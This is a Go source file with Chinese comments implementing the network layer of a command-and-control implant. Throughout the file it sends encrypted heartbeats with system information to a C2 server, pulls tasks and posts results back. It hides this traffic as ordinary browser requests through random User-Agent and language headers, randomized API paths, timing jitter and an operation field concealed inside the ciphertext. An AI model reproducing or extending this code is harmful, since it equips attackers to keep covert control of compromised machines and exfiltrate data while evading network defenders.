package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

// 全局配置（main.go 启动时设置）
var cfg *Config

// 流量伪装参数: 请求前随机延迟（模拟用户操作间隔）
const (
	stegoProb    = 0.7
	packetJitter = 0.3
)

// buildHeaders 构造伪装请求头（模拟真实浏览器请求，多浏览器随机）
// 纯密文 body 协议: Content-Type 用 text/plain，body 是 base64 密文，无 JSON 结构
func buildHeaders() http.Header {
	h := http.Header{}
	h.Set("Content-Type", "text/plain;charset=UTF-8")
	h.Set("User-Agent", randomUA())
	h.Set("Accept", "text/plain, */*;q=0.8")
	h.Set("Accept-Language", randomAcceptLanguage())
	h.Set("Accept-Encoding", "gzip, deflate, br")
	h.Set("Connection", "keep-alive")
	// 随机添加常见浏览器头（增强真实感）
	if rand.Float64() < 0.5 {
		h.Set("Cache-Control", "no-cache")
	}
	if rand.Float64() < 0.3 {
		h.Set("Pragma", "no-cache")
	}
	return h
}

// randomUA 随机生成真实浏览器 UA（Chrome/Edge/Firefox/Safari 多浏览器多平台）
func randomUA() string {
	browserType := rand.Intn(4)
	switch browserType {
	case 0:
		// Chrome on Windows/Mac/Linux
		platforms := []string{
			"Windows NT 10.0; Win64; x64",
			"Macintosh; Intel Mac OS X 10_15_7",
			"X11; Linux x86_64",
		}
		plat := platforms[rand.Intn(len(platforms))]
		chromeMajor := 128 + rand.Intn(12) // 128-139
		chromeBuild := 1000 + rand.Intn(8999)
		chromePatch := rand.Intn(100)
		return "Mozilla/5.0 (" + plat + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + itoa(chromeMajor) + ".0." + itoa(chromeBuild) + "." + itoa(chromePatch) + " Safari/537.36"
	case 1:
		// Edge on Windows/Mac
		platforms := []string{
			"Windows NT 10.0; Win64; x64",
			"Macintosh; Intel Mac OS X 10_15_7",
		}
		plat := platforms[rand.Intn(len(platforms))]
		edgeMajor := 128 + rand.Intn(12)
		edgeBuild := 1000 + rand.Intn(8999)
		edgePatch := rand.Intn(100)
		return "Mozilla/5.0 (" + plat + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + itoa(edgeMajor) + ".0." + itoa(edgeBuild) + "." + itoa(edgePatch) + " Safari/537.36 Edg/" + itoa(edgeMajor) + ".0." + itoa(edgeBuild) + "." + itoa(edgePatch)
	case 2:
		// Firefox on Windows/Mac/Linux
		platforms := []string{
			"Windows NT 10.0; Win64; x64",
			"Macintosh; Intel Mac OS X 14.0",
			"X11; Linux x86_64",
		}
		plat := platforms[rand.Intn(len(platforms))]
		ffMajor := 120 + rand.Intn(15) // 120-134
		return "Mozilla/5.0 (" + plat + "; rv:" + itoa(ffMajor) + ".0) Gecko/20100101 Firefox/" + itoa(ffMajor) + ".0"
	case 3:
		// Safari on Mac
		macVer := []string{"10_15_7", "11_0", "12_0", "13_0", "14_0"}
		ver := macVer[rand.Intn(len(macVer))]
		safariVer := 605 + rand.Intn(10) // 605-614
		return "Mozilla/5.0 (Macintosh; Intel Mac OS X " + ver + ") AppleWebKit/" + itoa(safariVer) + ".1.15 (KHTML, like Gecko) Version/17.0 Safari/" + itoa(safariVer) + ".1.15"
	}
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

// randomAcceptLanguage 随机 Accept-Language（避免固定 zh-CN 地理指纹）
func randomAcceptLanguage() string {
	langs := []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.8,zh-CN;q=0.7,zh;q=0.6",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"en-US,en;q=0.9",
		"de-DE,de;q=0.9,en;q=0.7",
		"fr-FR,fr;q=0.9,en;q=0.7",
		"ja-JP,ja;q=0.9,en;q=0.7",
	}
	return langs[rand.Intn(len(langs))]
}

// itoa 简易 int 转 string（避免引入 strconv）
func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	neg := false
	if n < 0 {
		neg = true
		n = -n
	}
	buf := [20]byte{}
	pos := len(buf)
	for n > 0 {
		pos--
		buf[pos] = byte('0' + n%10)
		n /= 10
	}
	if neg {
		pos--
		buf[pos] = '-'
	}
	return string(buf[pos:])
}

// randomPath 生成随机路径后缀，伪装为 RESTful API 资源 ID
// 格式: /api/v1/<16位随机hex>，每次请求不同，无固定路径特征
func randomPath() string {
	// 用时间戳 + 随机数生成 16 位 hex，避免固定路径
	n := rand.Int63()
	s := fmt.Sprintf("%x", n)
	if len(s) > 16 {
		s = s[:16]
	}
	for len(s) < 16 {
		s += fmt.Sprintf("%x", rand.Intn(16))
	}
	return "/api/v1/" + s
}

// httpPost 发送加密 POST 请求并解密响应
// 纯密文协议: body 是纯 base64(IV+密文)，无 JSON 外壳，算法用配置固定，_op 隐入加密内容
// 路径随机化: 每次请求路径 /api/v1/<随机hex>
func httpPost(op string, data interface{}) map[string]interface{} {
	url := cfg.C2Server + randomPath()

	// 把 _op 字段合并进 payload 内部（加密后网络层不可见）
	if m, ok := data.(map[string]interface{}); ok {
		m["_op"] = op
		data = m
	}

	algo := cfg.EncAlgo
	if algo == "" {
		algo = "none"
	}
	var bodyStr string
	if algo == "none" {
		j, _ := json.Marshal(data)
		bodyStr = base64.StdEncoding.EncodeToString(j)
	} else {
		enc, _, err := encEncrypt(data, algo, cfg.EncPassword)
		if err != nil {
			return nil
		}
		bodyStr = enc
	}

	// 随机抖动（模拟用户操作间隔，非固定节奏）
	if rand.Float64() < stegoProb {
		time.Sleep(time.Duration(rand.Float64()*packetJitter*1000) * time.Millisecond)
	}

	req, err := http.NewRequest("POST", url, bytes.NewBufferString(bodyStr))
	if err != nil {
		return nil
	}
	req.Header = buildHeaders()
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	if resp.StatusCode != 200 {
		return nil
	}
	return decryptResponse(string(raw))
}

// decryptResponse 从 HTTP 响应解密数据
// 新协议: 纯 base64(IV+密文)，用配置算法解密
// 兼容旧信封: {"_a":"...","_d":"..."} 格式
func decryptResponse(text string) map[string]interface{} {
	text = strings.TrimSpace(text)
	if text == "" {
		return nil
	}

	// 兼容旧信封格式（body 以 { 开头）
	if strings.HasPrefix(text, "{") {
		var envelope map[string]interface{}
		if err := json.Unmarshal([]byte(text), &envelope); err == nil {
			if algo, ok := envelope["_a"].(string); ok {
				encData, _ := envelope["_d"].(string)
				if encData == "" {
					return envelope
				}
				if algo == "none" || algo == "" {
					decoded, err := base64.StdEncoding.DecodeString(encData)
					if err == nil {
						var m map[string]interface{}
						if json.Unmarshal(decoded, &m) == nil {
							return m
						}
					}
					return nil
				}
				dec, err := encDecrypt(encData, algo, cfg.EncPassword)
				if err != nil {
					return nil
				}
				var m map[string]interface{}
				if json.Unmarshal(dec, &m) == nil {
					return m
				}
				return nil
			}
			// JSON 但不是信封，直接返回
			return envelope
		}
	}

	// 新协议: 纯 base64(IV+密文)
	algo := cfg.EncAlgo
	if algo == "" || algo == "none" {
		// none 模式: base64(JSON)
		decoded, err := base64.StdEncoding.DecodeString(text)
		if err == nil {
			var m map[string]interface{}
			if json.Unmarshal(decoded, &m) == nil {
				return m
			}
		}
		return nil
	}
	dec, err := encDecrypt(text, algo, cfg.EncPassword)
	if err != nil {
		return nil
	}
	var m map[string]interface{}
	if json.Unmarshal(dec, &m) == nil {
		return m
	}
	return nil
}

// agentPost 统一通信调度：根据 cfg.Protocol 分发到对应传输层
// http → httpPost, websocket → wsPost, tcp → tcpPost
func agentPost(op string, data interface{}) map[string]interface{} {
	switch cfg.Protocol {
	case "websocket":
		return wsPost(op, data)
	case "tcp":
		return tcpPost(op, data)
	default:
		return httpPost(op, data)
	}
}

// heartbeat 发送心跳，携带系统信息
func heartbeat() map[string]interface{} {
	info := getSystemInfo()
	info["client_id"] = cfg.ClientID
	resp := agentPost("heartbeat", info)
	if resp == nil {
		fmt.Printf("[!] heartbeat failed: no response\n")
	} else {
		fmt.Printf("[+] heartbeat ok: client_id=%s session=%v\n", cfg.ClientID, resp["session_id"])
	}
	return resp
}

// pullTasks 拉取待处理任务列表
func pullTasks() []map[string]interface{} {
	result := agentPost("pull", map[string]interface{}{"client_id": cfg.ClientID})
	if result == nil {
		return nil
	}
	tasks, ok := result["tasks"].([]interface{})
	if !ok {
		return nil
	}
	out := make([]map[string]interface{}, 0, len(tasks))
	for _, t := range tasks {
		if m, ok := t.(map[string]interface{}); ok {
			out = append(out, m)
		}
	}
	return out
}

// submitResult 回传任务执行结果
func submitResult(taskID interface{}, result string, status string) {
	if status == "" {
		status = "completed"
	}
	agentPost("result", map[string]interface{}{
		"task_id":   taskID,
		"client_id": cfg.ClientID,
		"status":    status,
		"result":    result,
	})
}
